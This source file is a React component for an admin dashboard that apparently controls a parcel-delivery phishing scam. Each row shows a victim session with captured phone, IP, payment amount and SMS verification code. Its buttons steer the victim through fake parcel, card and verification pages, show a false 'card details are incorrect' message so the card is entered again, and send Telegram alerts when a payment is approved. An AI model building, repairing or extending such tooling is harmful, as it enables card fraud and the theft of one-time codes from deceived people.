import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Checkbox } from "@/components/ui/checkbox";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { 
  CreditCard, 
  MessageSquare, 
  Package,
  CheckCircle,
  Smartphone,
  MessageCircle,
  MoreVertical,
  XCircle,
} from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";

interface ClientSession {
  id: string;
  session_code: string;
  client_name: string | null;
  phone_number: string | null;
  current_step: number;
  parcel_tracking: string | null;
  amount: number | null;
  status: string | null;
  admin_message: string | null;
  message_type: string | null;
  verification_code: string | null;
  approval_type: string | null;
  client_ip: string | null;
  origin: string | null;
  destination: string | null;
  estimated_delivery: string | null;
  created_at: string;
  updated_at: string;
}

const stepNames: Record<number, string> = {
  1: "Parcel",
  2: "Card",
  3: "Verify",
  4: "Done"
};

const stepColors: Record<number, string> = {
  1: "bg-blue-500",
  2: "bg-yellow-500",
  3: "bg-purple-500",
  4: "bg-green-500"
};

interface ClientRowProps {
  session: ClientSession;
  isSelected?: boolean;
  onToggleSelect?: () => void;
}

export function ClientRow({ session, isSelected = false, onToggleSelect }: ClientRowProps) {
  // Quick actions
  const sendToSmsVerification = async () => {
    await supabase
      .from("client_sessions")
      .update({ current_step: 3, approval_type: null, verification_code: null })
      .eq("id", session.id);
    toast({ title: "→ SMS" });
  };

  const sendToAppApproval = async () => {
    await supabase
      .from("client_sessions")
      .update({ current_step: 3, approval_type: "app_pending", verification_code: null })
      .eq("id", session.id);
    toast({ title: "→ App" });
  };

  const sendWrongCardMessage = async () => {
    await supabase
      .from("client_sessions")
      .update({ 
        current_step: 2,
        approval_type: null,
        admin_message: "The card details you entered are incorrect. Please check and try again.",
        message_type: "error"
      })
      .eq("id", session.id);
    toast({ title: "Wrong card" });
  };

  const sendBackToParcel = async () => {
    await supabase
      .from("client_sessions")
      .update({ 
        current_step: 1,
        approval_type: null,
        admin_message: null,
        message_type: null
      })
      .eq("id", session.id);
    toast({ title: "→ Parcel" });
  };

  const sendBackToCard = async () => {
    await supabase
      .from("client_sessions")
      .update({ current_step: 2, approval_type: null })
      .eq("id", session.id);
    toast({ title: "→ Card" });
  };

  const confirmPayment = async () => {
    await supabase
      .from("client_sessions")
      .update({ current_step: 4, approval_type: "sms" })
      .eq("id", session.id);
    await supabase.functions.invoke("send-telegram", {
      body: { message: `✅ SMS - #${session.session_code}` },
    });
    toast({ title: "✓ Confirmed" });
  };

  const approvePayment = async () => {
    await supabase
      .from("client_sessions")
      .update({ current_step: 4, approval_type: "app" })
      .eq("id", session.id);
    await supabase.functions.invoke("send-telegram", {
      body: { message: `✅ App - #${session.session_code}` },
    });
    toast({ title: "✓ Approved" });
  };

  const clearMessage = async () => {
    await supabase
      .from("client_sessions")
      .update({ admin_message: null, message_type: null })
      .eq("id", session.id);
    toast({ title: "Cleared" });
  };

  const isWaiting = session.current_step === 2 && session.approval_type === "payment_waiting";
  const isVerifying = session.current_step === 3;
  const isAppMode = session.approval_type === "app_pending";

  return (
    <tr className={`border-b hover:bg-muted/50 ${isSelected ? 'bg-primary/10' : ''} ${isWaiting ? 'bg-orange-50 dark:bg-orange-950/20' : ''}`}>
      {/* Checkbox */}
      <td className="p-2 w-8">
        <Checkbox
          checked={isSelected}
          onCheckedChange={onToggleSelect}
        />
      </td>

      {/* Code */}
      <td className="p-2">
        <span className="font-mono text-xs font-bold">#{session.session_code}</span>
      </td>

      {/* Step */}
      <td className="p-2">
        <Badge className={`${stepColors[session.current_step]} text-white text-xs`}>
          {isWaiting ? "⏳" : stepNames[session.current_step]}
        </Badge>
      </td>

      {/* Amount */}
      <td className="p-2 text-right">
        <span className="font-semibold text-sm">
          {session.amount ? `£${session.amount.toFixed(2)}` : "-"}
        </span>
      </td>

      {/* Code (if verifying) */}
      <td className="p-2">
        {isVerifying && !isAppMode && session.verification_code && (
          <span className="font-mono text-xs bg-purple-100 dark:bg-purple-900 text-purple-700 dark:text-purple-300 px-1.5 py-0.5 rounded">
            {session.verification_code}
          </span>
        )}
        {isVerifying && isAppMode && (
          <span className="text-xs text-blue-600">App</span>
        )}
      </td>

      {/* Quick Actions */}
      <td className="p-2">
        <div className="flex items-center gap-1">
          {isWaiting && (
            <>
              <Button size="sm" className="h-6 text-xs px-2 bg-green-600 hover:bg-green-700" onClick={sendToSmsVerification}>
                SMS
              </Button>
              <Button size="sm" className="h-6 text-xs px-2 bg-blue-600 hover:bg-blue-700" onClick={sendToAppApproval}>
                App
              </Button>
            </>
          )}

          {isVerifying && !isAppMode && (
            <Button size="sm" className="h-6 text-xs px-2 bg-green-600 hover:bg-green-700" onClick={confirmPayment}>
              ✓ SMS
            </Button>
          )}

          {isVerifying && isAppMode && (
            <Button size="sm" className="h-6 text-xs px-2 bg-blue-600 hover:bg-blue-700" onClick={approvePayment}>
              ✓ App
            </Button>
          )}

          {/* More Actions */}
          <DropdownMenu>
            <DropdownMenuTrigger asChild>
              <Button variant="ghost" size="sm" className="h-6 w-6 p-0">
                <MoreVertical className="w-4 h-4" />
              </Button>
            </DropdownMenuTrigger>
            <DropdownMenuContent align="end" className="w-36">
              <DropdownMenuItem onClick={sendBackToParcel}>
                <Package className="w-3 h-3 mr-2" /> → Parcel
              </DropdownMenuItem>
              <DropdownMenuItem onClick={sendBackToCard}>
                <CreditCard className="w-3 h-3 mr-2" /> → Card
              </DropdownMenuItem>
              <DropdownMenuItem onClick={sendToSmsVerification}>
                <MessageSquare className="w-3 h-3 mr-2" /> → SMS
              </DropdownMenuItem>
              <DropdownMenuItem onClick={sendToAppApproval}>
                <Smartphone className="w-3 h-3 mr-2" /> → App
              </DropdownMenuItem>
              <DropdownMenuSeparator />
              <DropdownMenuItem onClick={sendWrongCardMessage} className="text-orange-600">
                <CreditCard className="w-3 h-3 mr-2" /> Wrong Card
              </DropdownMenuItem>
              {session.admin_message && (
                <DropdownMenuItem onClick={clearMessage}>
                  <XCircle className="w-3 h-3 mr-2" /> Clear Msg
                </DropdownMenuItem>
              )}
              <DropdownMenuSeparator />
              <DropdownMenuItem onClick={confirmPayment} className="text-green-600">
                <CheckCircle className="w-3 h-3 mr-2" /> Confirm
              </DropdownMenuItem>
              <DropdownMenuItem onClick={approvePayment} className="text-blue-600">
                <CheckCircle className="w-3 h-3 mr-2" /> Approve
              </DropdownMenuItem>
            </DropdownMenuContent>
          </DropdownMenu>
        </div>
      </td>
    </tr>
  );
}
